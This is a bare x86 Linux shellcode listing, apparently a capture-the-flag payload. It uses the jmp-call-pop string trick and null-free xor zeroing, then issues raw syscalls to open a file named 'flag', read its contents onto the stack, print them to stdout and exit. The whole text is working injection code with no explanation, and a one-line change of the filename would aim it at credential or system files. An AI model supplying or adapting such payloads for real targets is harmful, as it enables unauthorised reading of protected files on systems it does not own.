section .text
global _start

_start:
	xor	eax,	eax
	xor	ebx,	ebx
	xor	ecx,	ecx
	xor	edx,	edx
	jmp 	short	_filename
_filename_loaded:
	mov	al,	0x5
	pop	ebx
	int 	0x80
	mov	ebx,	eax
	mov	al,	0x3
	mov	al,	0x3
	lea	ecx,	[esp+0xff]
	mov	dl,	0xff
	int 	0x80
	xor	eax,	eax
	mov	al,	0x4
	mov	bl,	0x1
	lea	ecx,	[esp+0xff]
	mov	dl,	0xff
	int 	0x80
	mov	al,	0x1
	xor	ebx,	ebx
	int 	0x80

_filename:
	call	_filename_loaded
	db	"flag",0x00 
